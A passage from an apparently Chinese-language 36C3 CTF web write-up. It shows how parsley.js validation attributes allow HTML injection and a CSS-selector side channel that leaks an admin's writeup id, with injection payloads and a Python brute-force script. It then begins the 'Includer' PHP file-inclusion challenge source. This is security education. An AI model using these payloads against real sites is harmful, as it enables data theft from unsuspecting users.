class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x5F80;&#x70B9;&#x51FB;&#x4E8B;&#x4EF6;&#x90A3;&#x4E00;&#x65B9;&#x9762;&#x601D;&#x8003;&#xFF0C;&#x5E76;&#x4E14;&#x5229;&#x7528;&#x9898;&#x76EE;&#x5F15;&#x5165;&#x7684;&#x4E24;&#x4E2A; js &#x6587;&#x4EF6;&#x5165;&#x624B;&#xFF0C;&#x4E00;&#x4E2A; jquery.js &#xFF0C;&#x53E6;&#x4E00;&#x4E2A; parsley.js&#x3002;</p><h3 id="Parsley-js"><a href="#Parsley-js" class="headerlink" title="Parsley.js"></a>Parsley.js</h3><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53BB; <a href="https://parsleyjs.org/doc/index.html" target="_blank" rel="noopener">parsley.js doc</a> &#x770B;&#x5230;&#x8BE5; lib &#x7684;&#x7B80;&#x5355;&#x8BF4;&#x660E;&#x4EE5;&#x53CA;&#x4F7F;&#x7528;&#xFF1A;</p><blockquote><p>Parsley is a javascript form validation library. It helps you provide your users with feedback on their form submission before sending it to your server. It saves you bandwidth, server load and it saves time for your users.</p><p>Javascript form validation is not necessary, and if used, it <strong>does not replace strong backend server validation.</strong></p><p>That&#x2019;s why Parsley is here: to let you define your general form validation, implement it on the backend side, and simply port it frontend-side, with maximum respect to user experience best practices.</p></blockquote><p>&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x8FD9;&#x662F;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x524D;&#x7AEF;&#x9A8C;&#x8BC1;&#x5E93;&#xFF0C;&#x7B80;&#x5355;&#x67E5;&#x4E00;&#x4E0B;&#x6587;&#x6863;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x6709;&#x51E0;&#x4E2A;&#x6709;&#x610F;&#x601D;&#x7684; API&#xFF1A;</p><blockquote><p><strong>data-parsley-trigger=&#x201D;input&#x201D;</strong></p><p>Specify one or many javascript events that will trigger item validation, before any failure. To set multiple events, separate them with a space data-parsley-trigger=&#x201D;focusin focusout&#x201D;. Default is null. See the various events supported by jQuery.</p><p><strong>data-parsley-error-message=&#x201D;my message&#x201D;</strong></p><p>Customize a unique global message for the field.</p><p><strong>data-parsley-errors-container=&#x201D;#element&#x201D;</strong></p><p>Specify the existing DOM container where ParsleyUI should put the errors. It is also possible to configure it with a callback function from javascript, see the annotated source.</p></blockquote><p>&#x6839;&#x636E;&#x6587;&#x6863;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>data-parsley-trigger</code>&#x8BBE;&#x7F6E;&#x6211;&#x4EEC;&#x7684;&#x89E6;&#x53D1;&#x65B9;&#x5F0F;&#xFF0C;&#x4F7F;&#x7528;<code>data-parsley-error-message</code>&#x6765;&#x81EA;&#x5B9A;&#x4E49;&#x6211;&#x4EEC;&#x7684;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#xFF0C;&#x4F7F;&#x7528;<code>data-parsley-errors-container</code>&#x6765;&#x81EA;&#x5B9A;&#x4E49;&#x6211;&#x4EEC;&#x7684;&#x663E;&#x793A;&#x9519;&#x8BEF;&#x7684;&#x4F4D;&#x7F6E;&#x3002;</p><p>&#x6839;&#x636E;&#x6587;&#x6863;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7528;&#x4E00;&#x4E2A;<code>data-parsley-validate</code>&#x6307;&#x5B9A;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x9A8C;&#x8BC1;&#x7684;&#x8868;&#x5355;&#xFF0C;&#x7136;&#x540E;&#x5229;&#x7528;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x628A;&#x5143;&#x7D20;&#x6807;&#x7B7E;&#x8F93;&#x51FA;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x63A5;&#x7740;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x6307;&#x5B9A;&#x8F93;&#x51FA;&#x4F4D;&#x7F6E;&#x6765;&#x63A7;&#x5236;&#x8F93;&#x51FA;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> </span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-trigger</span>=<span class="hljs-string">&quot;blur&quot;</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;some-field&quot;</span></span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-error-message</span>=<span class="hljs-string">&quot;&lt;input id=like type=button value=padyload&gt;&quot;</span> </span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-required</span></span></span><br><span class="line"><span class="hljs-tag">            <span class="hljs-attr">data-parsley-errors-container</span>=<span class="hljs-string">&quot;#div1&quot;</span>/&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><code>data-parsley-trigger</code>&#x6307;&#x5B9A;&#x4E86;<code>blur</code>&#x4E8B;&#x4EF6;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5F53;&#x6211;&#x4EEC;&#x7684; input &#x5931;&#x7126;&#x65F6;&#xFF0C;&#x4F1A;&#x663E;&#x793A;&#x6211;&#x4EEC;&#x7684;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#xFF0C;&#x5E76;&#x4E14;&#x5728; id &#x4E3A; div1 &#x7684;&#x5143;&#x7D20;&#x4E2D;&#x663E;&#x793A;&#xFF0C;&#x66F4;&#x91CD;&#x8981;&#x7684;&#x662F;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x4E5F;&#x5C06;&#x5176;&#x8FDB;&#x884C;&#x4E86;&#x6E32;&#x67D3;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108013312.png" alt></p><p>###Click</p><p>&#x56DE;&#x5230;&#x9898;&#x76EE;&#x5F53;&#x4E2D;&#xFF0C;admin &#x6240;&#x505A;&#x7684;&#x52A8;&#x4F5C;&#x6709;&#x4E24;&#x4E2A;&#xFF0C;&#x4E00;&#x4E2A;&#x5C31;&#x662F;&#x767B;&#x5F55;&#xFF0C;&#x6839;&#x636E;&#x9898;&#x76EE;&#x4FE1;&#x606F;&#xFF0C;&#x6211;&#x4EEC;&#x57FA;&#x672C;&#x4E0A;&#x5BF9;&#x8FD9;&#x4E2A;&#x64CD;&#x4F5C;&#x6CA1;&#x529E;&#x6CD5;&#x8FDB;&#x884C;&#x4EC0;&#x4E48;&#x5E72;&#x6270;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x5C31;&#x662F;&#x70B9;&#x8D5E;&#x4E86;&#xFF0C;&#x66F4;&#x5177;&#x4F53;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#x901A;&#x8FC7; show.php &#x6253;&#x5F00;&#x4F60;&#x7684; writeup &#x5185;&#x5BB9;&#xFF0C;&#x5E76;&#x4E14;&#x70B9;&#x51FB;&#x9875;&#x9762;&#x4E0A; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x66F4;&#x53EF;&#x80FD;&#x7684;&#x4E8B;&#x5BF9;&#x70B9;&#x8D5E;&#x64CD;&#x4F5C;&#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x5E72;&#x6270;&#x6216;&#x8005;&#x5176;&#x4ED6;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x4E14;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x6D4B;&#x8BD5;&#xFF0C;&#x901A;&#x8FC7; <code>selenium.webdriver</code>&#x8C03;&#x7528;<code>find_element_by_xpath</code>&#x51FD;&#x6570;&#x5F97;&#x5230;&#x7684; id &#x4E3A; like &#x7684; input &#x5143;&#x7D20;&#x53EA;&#x80FD;&#x6709;&#x7B2C;&#x4E00;&#x4E2A;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5373;&#x4F7F;&#x6211;&#x4EEC;&#x5728; writeup &#x5185;&#x5BB9;&#x4E2D;&#x63D2;&#x5165;&#x4E00;&#x4E2A; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#xFF0C;admin &#x4E5F;&#x53EA;&#x4F1A;&#x6839;&#x636E;&#x9875;&#x9762;&#x987A;&#x5E8F;&#x62FF;&#x5230;&#x7B2C;&#x4E00;&#x4E2A;&#x70B9;&#x8D5E; input &#x3002;</p><p>&#x5E76;&#x4E14; CSP &#x4E5F;&#x9650;&#x5236;&#x5F97;&#x5F88;&#x4E25;&#x683C;&#xFF0C;&#x4F3C;&#x4E4E;&#x9677;&#x5165;&#x4E86;&#x50F5;&#x5C40;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x6709;&#x4EE5;&#x4E0A; parsley.js &#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x6211;&#x4EEC;&#x4F3C;&#x4E4E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x6765;&#x6784;&#x9020;&#x4E00;&#x4E9B; Payload &#x3002;</p><p>&#x9996;&#x5148;&#xFF0C;&#x56E0;&#x4E3A;<code>find_element_by_xpath</code>&#x53EA;&#x4F1A;&#x5F97;&#x5230;&#x7B2C;&#x4E00;&#x4E2A; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#xFF0C;&#x800C;&#x6211;&#x4EEC;&#x901A;&#x8FC7; parsley.js &#x53EF;&#x4EE5;&#x5C06;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x8F93;&#x51FA;&#x5230;&#x6307;&#x5B9A;&#x9875;&#x9762;&#x4F4D;&#x7F6E;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5927;&#x6982;&#x53EF;&#x4EE5;&#x6709;&#x4E00;&#x4E2A;&#x60F3;&#x6CD5;&#xFF0C;&#x628A;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;&#x7528;&#x7684;&#x5355;&#x72EC;&#x7684; id &#x4E3A; like &#x7684; input &#x6807;&#x7B7E;&#x63D2;&#x5165;&#x5230;&#x539F;&#x6765;&#x7684;&#x70B9;&#x8D5E;&#x6309;&#x94AE;&#x4E4B;&#x524D;&#x3002;</p><p>&#x4F46;&#x662F;&#x8FD9;&#x6709;&#x4EC0;&#x4E48;&#x7528;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x518D;&#x6765;&#x4ED4;&#x7EC6;&#x770B;&#x770B; admin &#x8981;&#x70B9;&#x8D5E;&#x7684;&#x90A3;&#x4E2A;&#x9875;&#x9762;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108015154.png" alt></p><p>&#x9875;&#x9762;&#x4E0A;&#x90E8;&#x5206;&#x662F; header.php &#xFF0C;&#x4F1A;&#x5C55;&#x793A;&#x5F53;&#x524D;&#x7528;&#x6237;&#x6240;&#x63D0;&#x4EA4;&#x7684; writeup &#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4; admin &#x7684;&#x8FD9;&#x4E2A;&#x9875;&#x9762;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x4E5F;&#x662F;&#x552F;&#x4E00;&#x4E00;&#x4E2A; a &#x6807;&#x7B7E;&#x5C31;&#x662F; flag &#x7684;&#x5730;&#x5740;&#xFF0C;&#x73B0;&#x5728;&#x7684;&#x95EE;&#x9898;&#x5C31;&#x53D8;&#x6210;&#x4E86;&#x6211;&#x4EEC;&#x600E;&#x4E48;&#x83B7;&#x53D6;&#x8FD9;&#x4E2A;&#x5730;&#x5740;&#x7684;&#x95EE;&#x9898;&#x4E86;&#xFF0C;&#x66F4;&#x8BE6;&#x7EC6;&#x7684;&#x6765;&#x8BF4;&#xFF0C;&#x6211;&#x4EEC;&#x5982;&#x4F55;&#x83B7;&#x53D6;&#x8FD9;&#x4E2A; a &#x6807;&#x7B7E;&#x4E2D;&#x7684; href &#x5C5E;&#x6027;&#x503C;&#xFF0C;&#x6216;&#x8005;&#x66F4;&#x786E;&#x5207;&#x7684;&#x8BF4;&#x5C31;&#x662F;&#x83B7;&#x53D6; writeup id &#x7684;&#x4E8B;&#x60C5;&#x4E86;&#x3002;</p><h3 id="CSS-Selector"><a href="#CSS-Selector" class="headerlink" title="CSS Selector"></a>CSS Selector</h3><p>&#x5982;&#x4F55;&#x83B7;&#x53D6; a &#x6807;&#x7B7E;&#x4E2D;&#x7684; href &#x5C5E;&#x6027;&#x503C;&#x8C8C;&#x4F3C;&#x4E5F;&#x5C31;&#x8DDF;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x63D0;&#x5230;&#x7684;<code>data-parsley-errors-container</code> API &#x6709;&#x5173;&#x4E86;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A; API &#x53C8;&#x652F;&#x6301; CSS &#x9009;&#x62E9;&#x5668;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x662F;&#x4E0D;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; CSS &#x9009;&#x62E9;&#x5668;&#x6765;&#x8BA9;&#x6211;&#x4EEC;&#x7684;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x653E;&#x5230;&#x8FD9;&#x4E2A; a &#x6807;&#x7B7E;&#x4E4B;&#x540E;&#x5462;&#xFF0C;&#x8FD9;&#x6837;&#x4EE5;&#x6765;&#x4E5F;&#x5C31;&#x76F4;&#x63A5;&#x5C31;&#x653E;&#x5230;&#x4E86;&#x70B9;&#x8D5E;&#x6309;&#x94AE;&#x4E4B;&#x524D;&#x4E86;&#x3002;</p><p>&#x7C7B;&#x4F3C;&#x4E4B;&#x524D; XCTF Final &#x4E00;&#x4E2A; CSS &#x4FA7;&#x4FE1;&#x9053;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528;<code>a[href^=&apos;/show.php?id={flag}]</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x5143;&#x7D20;&#x9009;&#x62E9;&#x3002;</p><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684; flag &#x503C;&#x4E0E;&#x9875;&#x9762;&#x4E2D;&#x7684; href &#x5C5E;&#x6027;&#x503C;&#x4E5F;&#x5C31;&#x662F; writeup id &#x524D;&#x90E8;&#x5206;&#x5B8C;&#x5168;&#x5339;&#x914D;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x628A;&#x4E00;&#x4E2A;&#x65E0;&#x6548;&#x7684; id=like input &#x6807;&#x7B7E;&#x63D2;&#x5165;&#x5230;&#x8BE5; a &#x6807;&#x7B7E;&#x4E4B;&#x540E;&#xFF0C;&#x4EA6;&#x5373;&#x771F;&#x6B63;&#x7528;&#x4E8E;&#x63D0;&#x4EA4; like &#x8BF7;&#x6C42;&#x7684; input &#x6807;&#x7B7E;&#x4E4B;&#x524D;&#xFF1B;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684; flag &#x503C;&#x4E0E;&#x9875;&#x9762;&#x4E2D;&#x7684; href &#x5C5E;&#x6027;&#x503C;&#x4E5F;&#x5C31;&#x662F; writeup id &#x524D;&#x90E8;&#x5206;&#x4E0D;&#x5B8C;&#x5168;&#x5339;&#x914D;&#x7684;&#xFF0C;parsley.js &#x4EC0;&#x4E48;&#x4E5F;&#x4E0D;&#x4F1A;&#x505A;&#xFF0C;admin &#x4F1A;&#x6B63;&#x5E38;&#x5730;&#x70B9;&#x8D5E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x5730;&#x5728;&#x81EA;&#x5DF1;&#x7684; writeup &#x9875;&#x9762;&#x770B;&#x5230; admin &#x7684;&#x70B9;&#x8D5E;&#x3002;</p><p>&#x6240;&#x4EE5;&#x57FA;&#x4E8E;&#x8FD9;&#x4E2A;&#x5DEE;&#x5F02;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x4FA7;&#x4FE1;&#x9053;&#x653B;&#x51FB;&#x83B7;&#x53D6; flag &#x7684; writeup id&#x3002;</p><p>&#x811A;&#x672C;&#x7F16;&#x5199;&#x4E5F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF1A;</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">base_url = <span class="hljs-string">&quot;http://ip:8001/&quot;</span></span><br><span class="line"></span><br><span class="line">res = s.get(base_url)</span><br><span class="line"></span><br><span class="line">pos = res.text.find(<span class="hljs-string">&apos;name=&quot;c&quot; value=&quot;&apos;</span>) + len(<span class="hljs-string">&apos;name=&quot;c&quot; value=&quot;&apos;</span>)</span><br><span class="line">csrftoken = res.text[pos:pos+<span class="hljs-number">16</span>]</span><br><span class="line"></span><br><span class="line">ss = <span class="hljs-string">&quot;1234567890abcdef&quot;</span></span><br><span class="line">flag = <span class="hljs-string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):</span><br><span class="line">    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> ss:</span><br><span class="line">        payload = <span class="hljs-string">f&quot;&lt;form data-parsley-validate&gt;&lt;input data-parsley-required data-parsley-trigger=\&quot;blur\&quot; data-parsley-error-message=&apos;&lt;input type=\&quot;input\&quot; id=like value=\&quot;rebirth_is_really_nb\&quot;&gt;&apos; data-parsley-errors-container=\&quot;a[href^=&apos;/show.php?id=<span class="hljs-subst">{flag + j}</span>&apos;]\&quot; autofocus&gt;&lt;/form&gt;&quot;</span></span><br><span class="line">        data = {<span class="hljs-string">&apos;c&apos;</span>: csrftoken, <span class="hljs-string">&apos;content&apos;</span>: payload}</span><br><span class="line">        res = s.post(base_url + <span class="hljs-string">&quot;add.php&quot;</span>, data=data, allow_redirects=<span class="hljs-literal">False</span>)</span><br><span class="line">        <span class="hljs-comment"># print(res.headers)</span></span><br><span class="line">        location = res.headers[<span class="hljs-string">&apos;Location&apos;</span>]</span><br><span class="line">        pos = location.find(<span class="hljs-string">&apos;id=&apos;</span>) + <span class="hljs-number">3</span></span><br><span class="line">        wp = location[pos:]</span><br><span class="line">        data = {<span class="hljs-string">&apos;c&apos;</span>: csrftoken, <span class="hljs-string">&apos;id&apos;</span>: wp}</span><br><span class="line">        res = s.post(base_url + <span class="hljs-string">&quot;admin.php&quot;</span>, data=data)</span><br><span class="line">        time.sleep(<span class="hljs-number">3</span>)</span><br><span class="line"></span><br><span class="line">        res = s.get(<span class="hljs-string">f&quot;http://ip:8001/show.php?id=<span class="hljs-subst">{wp}</span>&quot;</span>)</span><br><span class="line">        <span class="hljs-comment"># print(res.text)</span></span><br><span class="line">        txt = res.text.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Liked by&lt;/h3&gt;admin&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> txt:</span><br><span class="line">            flag += j</span><br><span class="line">            print(i,flag)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x62FF;&#x5230; writeup id &#x4E4B;&#x540E;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x5373;&#x53EF;&#xFF1A;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200108021442.png" alt></p><h3 id="Other-Selector"><a href="#Other-Selector" class="headerlink" title="Other Selector"></a>Other Selector</h3><p>&#x5F53;&#x7136;&#x8BE5;&#x9875;&#x9762;&#x4E0D;&#x4EC5;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; a &#x6807;&#x7B7E;&#x7684; href &#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x83B7;&#x53D6; writeup id&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5B83; value &#x503C;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;like&quot;</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">data-parsley-trigger</span>=<span class="hljs-string">&quot;blur&quot;</span> <span class="hljs-attr">autofocus</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;some-field&quot;</span> </span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">data-parsley-error-message</span>=<span class="hljs-string">&quot;&lt;input id=like type=button&gt;&quot;</span> <span class="hljs-attr">data-parsley-required</span></span></span><br><span class="line"><span class="hljs-tag">         <span class="hljs-attr">data-parsley-errors-container</span>=<span class="hljs-string">&quot;a:contains(&apos;Writeup - 5&apos;):eq(0)&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6216;&#x8005;&#x4F7F;&#x7528;<code>data-parsley-equalto</code> API &#x8FDB;&#x884C;&#x5224;&#x65AD;&#x5C5E;&#x6027;&#x503C;&#xFF1A;</p><blockquote><p><strong>data-parsley-equalto=&#x201D;#anotherfield&#x201D;</strong></p><p>Validates that the value is identical to another field&#x2019;s value (useful for password confirmation check).</p></blockquote><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> </span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-trigger</span>=<span class="hljs-string">&quot;focusout&quot;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-equalto</span>=<span class="hljs-string">&apos;a[href^=&quot;/show.php?id=GUESS&quot;]&apos;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-errors-container</span>=<span class="hljs-string">&quot;form[action=&apos;/like.php&apos;]&quot;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">data-parsley-error-message</span>=<span class="hljs-string">&apos;&lt;input type=&quot;input&quot; name=&quot;id&quot; value=&quot;0000000000000000&quot;&gt;&apos;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">value</span>=<span class="hljs-string">&apos;a[href^=&quot;/show.php?id=GUESS&quot;]&apos;</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">autofocus</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Includer"><a href="#Includer" class="headerlink" title="Includer"></a>Includer</h2><blockquote><p><strong>Difficulty estimate</strong>: medium</p><p><strong>Solved</strong>:9/321</p><p><strong>Points</strong>: round(1000 &#xB7; min(1, 10 / (9 + [9 solves]))) = <strong>556</strong> points</p><p><strong>Description:</strong></p><p>Just sitting here and waiting for PHP 8.0 (lolphp).</p><p><strong>Download:</strong></p><p><a href="https://github.com/ZeddYu/36c3-CTF-Web/blob/master/includer/includer-df39401c4c1c28ab.tar.xz" target="_blank" rel="noopener">includer-df39401c4c1c28ab.tar.xz (3.5 KiB)</a></p></blockquote><p>&#x9898;&#x76EE;&#x7ED9;&#x51FA;&#x6E90;&#x4EE3;&#x7801;&#x4EE5;&#x53CA;&#x90E8;&#x7F72;&#x6587;&#x4EF6;&#xFF0C;&#x6E90;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);</span><br><span class="line"></span><br><span class="line">$rand_dir = <span class="hljs-string">&apos;files/&apos;</span>.bin2hex(random_bytes(<span class="hljs-number">32</span>));</span><br><span class="line">mkdir($rand_dir) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;mkdir&apos;</span>);</span><br><span class="line">putenv(<span class="hljs-string">&apos;TMPDIR=&apos;</span>.<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&apos;/&apos;</span>.$rand_dir) || <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;putenv&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;Hello &apos;</span>.$_POST[<span class="hljs-string">&apos;name&apos;</span>].<span class="hljs-string">&apos; your sandbox: &apos;</span>.$rand_dir.<span class="hljs-string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">try</span> {</span><br><span class="line">    <span class="hljs-keyword">if</span> (stripos(file_get_contents($_POST[<span class="hljs-string">&apos;file&apos;</span>]), <span class="hljs-string">&apos;&lt;?&apos;</span>) === <span class="hljs-keyword">false</span>) {</span><br><span class="line">        <span class="hljs-keyword">include_once</span>($_POST[<span class="hljs-string">&apos;file&apos;</span>]);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">finally</span> {</span><br><span class="line">    system(<span class="hljs-string">&apos;rm -rf &apos;</span>.escapeshellarg($rand_dir));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Configuration-Error"><a href="#Configuration-Error" class="headerlink" title="Configuration Error"></a>Configuration 